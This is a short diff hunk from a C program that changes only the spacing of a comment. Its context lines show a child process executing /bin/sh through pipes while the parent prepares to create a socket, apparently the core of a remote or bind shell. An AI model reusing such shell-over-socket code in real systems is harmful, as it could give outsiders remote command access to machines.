@@ -76,7 +76,7 @@ void main(int argc, char *argv[])
       
       execve("/bin/sh", 0, 0);
     } else {      
-      close(in[0]); // close read end
+      close(in[0]);  // close read end
       close(out[1]); // close write end
       
       // create a socket
